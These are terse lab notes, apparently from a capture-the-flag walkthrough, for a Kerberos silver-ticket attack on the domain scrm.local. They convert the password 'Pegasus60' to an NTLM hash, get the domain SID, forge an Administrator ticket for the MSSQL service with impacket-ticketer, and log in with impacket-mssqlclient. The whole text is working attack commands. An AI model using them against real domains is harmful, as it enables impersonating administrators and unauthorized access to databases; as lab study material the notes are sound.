```
generate NTLM hash or get it anywherelse: https://codebeautify.org/ntlm-hash-generator (user password) B999A16500B87D17EC7F2E2A68778F05 for Pegasus60

you can get SID with (impacket-secretsdump -k scrm.local/ksimpson@dc1.scrm.local -no-pass -debug) or LDAP  S-1-5-21-2743207045-1827831105-2542523200-500

impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -
domain scrm.local -spn MSSQLSVC/dc1.scrm.local -user-id 500 Administrator

impacket-mssqlclient -k dc1.scrm.local -no-pass
```